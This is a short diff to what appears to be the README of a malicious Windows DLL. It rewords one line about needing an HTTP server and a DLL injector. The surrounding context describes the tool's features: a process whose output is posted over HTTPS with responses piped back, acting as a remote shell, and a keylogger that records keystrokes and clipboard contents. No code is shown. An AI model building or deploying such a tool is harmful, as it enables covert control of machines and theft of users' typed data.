@@ -5,7 +5,7 @@ It spawns a process and posts all of STDOUT over HTTPS and pipes HTTPS responses
 It also starts a keylogger. Keylogger will save all English language characters. 
 Upon detecting Ctrl-V, keylogger will record the contents of the clipboard. 
 
-You must have a running HTTP server and a DLL injector. 
+Need a running HTTP server and a DLL injector. 
 
 Configure the following options in pch.h 
 
